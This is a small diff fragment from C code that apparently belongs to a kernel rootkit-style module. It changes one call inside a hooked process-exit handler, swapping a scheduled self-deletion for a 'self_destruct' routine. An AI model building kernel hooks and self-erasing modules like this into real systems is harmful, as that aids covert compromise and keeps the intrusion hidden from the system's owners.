@@ -200,7 +200,7 @@ static void hook_do_exit(long code)
     rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);
 
     if (should_unload)
-        rooti_schedule_self_deletion();
+        rooti_self_destruct();
 
     orig_do_exit(code);
 }
